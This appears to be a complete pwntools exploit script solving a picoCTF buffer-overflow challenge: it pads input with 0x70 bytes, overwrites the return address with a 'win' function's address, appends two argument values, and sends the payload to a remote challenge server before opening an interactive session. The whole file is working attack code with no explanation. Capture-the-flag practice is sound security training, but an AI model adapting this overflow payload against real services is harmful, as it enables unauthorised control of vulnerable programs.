from pwn import *

e = ELF('./vuln')
p = remote("saturn.picoctf.net", 50328)#process('./vuln')
addr = e.symbols['win']
#db.attach(p, gdbscript='break *vuln+57')
#need to make 2 int params: \xcafef00d, \xf00df00d

b = b''
b += b'A' * 0x70
#b += b'B' * 8
b += p64(addr)
b += p32(0xcafef00d)
b += p32(0xf00df00d)
#b += p64(addr)

p.sendline(b)
p.interactive()

